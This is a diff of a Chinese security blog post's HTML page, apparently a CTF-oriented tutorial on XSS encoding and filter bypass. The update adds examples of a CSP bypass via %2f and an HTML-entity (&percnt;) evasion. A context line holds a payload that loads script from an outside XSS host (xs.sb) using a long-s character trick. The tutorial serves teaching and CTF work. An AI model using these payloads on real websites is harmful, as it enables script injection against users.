@@ -29,7 +29,11 @@
 <meta property="og:image" content="https://s2.ax1x.com/2019/09/10/napYrV.png">
 <meta property="og:image" content="https://s2.ax1x.com/2019/09/10/napWIe.png">
 <meta property="og:image" content="https://s2.ax1x.com/2019/09/10/naM00g.png">
-<meta property="og:updated_time" content="2019-09-15T07:35:40.553Z">
+<meta property="og:image" content="https://s2.ax1x.com/2019/09/15/nguaA1.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/09/15/ngKLse.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/09/15/ng1QQf.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/09/15/ng10yT.png">
+<meta property="og:updated_time" content="2019-09-29T07:42:35.624Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="xss编码绕过原理以及从中学习到的几个例子">
 <meta name="twitter:description" content="前言最近看了一些xss利用方式，发现本人在以前对编码绕过这一个点的原理好像没有太本质性的理解，所以就有了这篇文章，对浏览器进行解析的顺序有一个记录，也从中收获到点东西，准备校赛出一个题目关于这个内容">
@@ -420,7 +424,18 @@
 <p>另外就是要绕过<code>&lt;_</code>的问题，因为后台匹配的是<code>&lt;</code>符号后面接上正常的字母，如果使用的是不正常的英文字母呢？这里刚好有另外一个条件就是转化大写的这个操作，这个操作很妙，因为HTML标签是不区分大小写的，这样我们使用下图的这个拉丁字母，当转化成大写的话就刚好是S，而且好像是只有这个拉丁文才有这样的效果。</p>
 <p><img src="https://s2.ax1x.com/2019/09/10/naM00g.png" alt="naM00g.png" style="zoom: 30%;"></p>
 <p>妙啊，最后的payload：<code>&lt;ſcript src=//xs.sb/idqS&gt;&lt;/script&gt;</code></p>
-<p>例子三和例子四，等校赛之后再放出来吧</p>
+<p><strong>例子四</strong></p>
+<p>这个例子是一个来自我在推特上看到一位师傅的骚操作，然后以这个例子出了一个csp绕过的题目。本质上就是这个例子XD</p>
+<p><img src="https://s2.ax1x.com/2019/09/15/nguaA1.png" alt="nguaA1.png" style="zoom:50%;"></p>
+<p>这位师傅也已经说得很清楚了，当我们使用<code>%2f</code>代替<code>/</code>的时候就会有一个绕过的效果，并且图中的<code>XYZ</code>是可以任意替换的。实际上我们引入的内容是这个站点下的内容：<code>https://pastebin.com/raw/b0Rajxqk</code>，里面的内容就是一个<code>alert(1)</code></p>
+<p>我们可以尝试一下，效果如下：</p>
+<p><img src="https://s2.ax1x.com/2019/09/15/ngKLse.png" alt="ngKLse.png" style="zoom:67%;"></p>
+<p><strong>例子五</strong></p>
+<p>这个例子是结合了上面的例子三以及本篇文章的内容，这里我是将所有输入的内容含有<code>%2f</code>进行了处理，把含有<code>%2f</code>都会删掉，这里需要使用本文的一个内容，就是利用浏览器的解析顺序，而且我们可以注意到这里我们输入的内容都会进入到src属性里面去，上文说到在属性值状态中HTML字符实体将会从“&amp;#…”形式解码，所以我们可以利用HTML实体编码去进行一个绕过。</p>
+<p>使用的是<code>%</code>的一个html编码进行绕过，也就是<code>&amp;percnt;</code></p>
+<p><img src="https://s2.ax1x.com/2019/09/15/ng1QQf.png" alt="ng1QQf.png" style="zoom:50%;"></p>
+<p>触发效果：</p>
+<p><img src="https://s2.ax1x.com/2019/09/15/ng10yT.png" alt="ng10yT.png"></p>
 <h3 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a>Referer</h3><p><a href="https://saucer-man.com/information_security/103.html" target="_blank" rel="noopener">https://saucer-man.com/information_security/103.html</a></p>
 <p><a href="http://bobao.360.cn/learning/detail/292.html" target="_blank" rel="noopener">http://bobao.360.cn/learning/detail/292.html</a></p>
 
@@ -434,7 +449,7 @@
         <p><span>本文标题:</span><a href="/xss-encodeorder.html">xss编码绕过原理以及从中学习到的几个例子</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">0verWatch</a></p>
         <p><span>发布时间:</span>2019-09-10, 23:29:45</p>
-        <p><span>最后更新:</span>2019-09-15, 15:35:40</p>
+        <p><span>最后更新:</span>2019-09-29, 15:42:35</p>
         <p>
             <span>原始链接:</span><a class="post-url" href="/xss-encodeorder.html" title="xss编码绕过原理以及从中学习到的几个例子">0verwatch.top/xss-encodeorder.html</a>
             <span class="copy-path" data-clipboard-text="原文: 0verwatch.top/xss-encodeorder.html　　作者: 0verWatch" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
